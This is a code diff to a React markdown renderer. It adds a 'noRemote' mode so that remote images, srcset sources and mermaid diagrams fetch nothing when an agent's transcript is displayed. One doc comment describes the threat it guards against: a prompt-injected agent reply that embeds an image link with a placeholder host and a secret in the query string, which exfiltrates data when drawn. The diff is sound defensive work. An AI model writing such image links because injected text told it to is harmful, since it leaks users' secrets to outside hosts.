@@ -124,6 +124,32 @@ function BodyImage({ src, alt }: { src: string | undefined; alt: string | undefi
   );
 }
 
+/**
+ * One image in text that loads nothing (`noRemote`): a `data:` image is drawn —
+ * it is already here — and any other is its alt text and its address, as text.
+ * Not a link either: the address is the payload, and opening it would send it.
+ */
+function InertImage({ src, alt }: { src: string | undefined; alt: string | undefined }) {
+  if (src?.startsWith("data:image/")) {
+    return (
+      <img
+        src={src}
+        alt={alt ?? ""}
+        className="my-2.5 max-w-full rounded-lg border border-line-3"
+      />
+    );
+  }
+  return (
+    <span
+      className="my-2.5 flex min-w-0 flex-col gap-0.5 rounded-lg border border-dashed border-line-3 px-2.5 py-2 text-[11px] text-muted-3"
+      title="Images from the network aren't loaded here."
+    >
+      <span>{alt || "Image"}</span>
+      {src && <span className="font-mono text-muted-4">{src}</span>}
+    </span>
+  );
+}
+
 /** A hast node, structurally — enough to walk a `<pre>` without pulling in the
  *  full hast types for two fields. */
 interface HastLike {
@@ -382,6 +408,22 @@ export function normalizeLinearMarkdown(md: string): string {
   );
 }
 
+/**
+ * What `noRemote` renders with: nothing in the text may make the webview fetch.
+ * Images go through {@link InertImage}; `<picture>`/`<source>` go entirely,
+ * because GitHub's schema lets `<source srcset>` through and a `srcset` is never
+ * protocol-checked — a remote address there loads the moment it is drawn. Links
+ * stay links: they open only on a click, through the opener.
+ */
+const inertSchema = {
+  ...sanitizeSchema,
+  tagNames: sanitizeSchema.tagNames.filter((tag) => tag !== "picture" && tag !== "source"),
+};
+const inertImg: Components["img"] = ({ src, alt }) => (
+  <InertImage src={typeof src === "string" ? src : undefined} alt={alt} />
+);
+const inertComponents: Components = { ...components, img: inertImg };
+
 // Parsing markdown (especially issue bodies with inline base64 images) is the
 // single most expensive render in the app. Memoize on the source string so an
 // unrelated re-render (selection change, resize) never re-parses an already
@@ -389,9 +431,16 @@ export function normalizeLinearMarkdown(md: string): string {
 export const Markdown = memo(function Markdown({
   children,
   className,
+  noRemote = false,
 }: {
   children: string;
   className?: string;
+  /** Fetch nothing while rendering: no remote image (it is shown as its alt
+   *  text and address instead), no `srcset`. For text whose author may have been
+   *  steered into carrying the user's data — an agent's transcript, where a
+   *  prompt-injected reply can write `![](https://host/?q=<secret>)` and drawing
+   *  it would be the request that sends it. */
+  noRemote?: boolean;
 }) {
   return (
     // The trailing-margin reset is why a comment card doesn't end in a band of
@@ -403,8 +452,8 @@ export const Markdown = memo(function Markdown({
     >
       <ReactMarkdown
         remarkPlugins={[remarkGfm, remarkBreaks, literalizeUnknownHtml]}
-        rehypePlugins={[rehypeRaw, [rehypeSanitize, sanitizeSchema]]}
-        components={components}
+        rehypePlugins={[rehypeRaw, [rehypeSanitize, noRemote ? inertSchema : sanitizeSchema]]}
+        components={noRemote ? inertComponents : components}
         urlTransform={urlTransform}
       >
         {/* Trimmed: `remarkBreaks` turns a trailing blank line into a real `<br>`,
@@ -461,12 +510,24 @@ const documentComponents: Components = {
   },
 };
 
+/** A document under `noRemote`: as {@link inertComponents}, and its diagrams
+ *  stay source — a mermaid diagram can name remote images (an `img` shape) that
+ *  drawing it would fetch. */
+const inertDocumentComponents: Components = {
+  ...documentComponents,
+  img: inertImg,
+  pre: components.pre,
+};
+
 export const MarkdownDocument = memo(function MarkdownDocument({
   children,
   className,
+  noRemote = false,
 }: {
   children: string;
   className?: string;
+  /** As {@link Markdown}'s, and diagrams are shown as their source. */
+  noRemote?: boolean;
 }) {
   return (
     <div
@@ -474,8 +535,8 @@ export const MarkdownDocument = memo(function MarkdownDocument({
     >
       <ReactMarkdown
         remarkPlugins={[remarkGfm, literalizeUnknownHtml]}
-        rehypePlugins={[rehypeRaw, [rehypeSanitize, sanitizeSchema]]}
-        components={documentComponents}
+        rehypePlugins={[rehypeRaw, [rehypeSanitize, noRemote ? inertSchema : sanitizeSchema]]}
+        components={noRemote ? inertDocumentComponents : documentComponents}
         urlTransform={urlTransform}
       >
         {children}
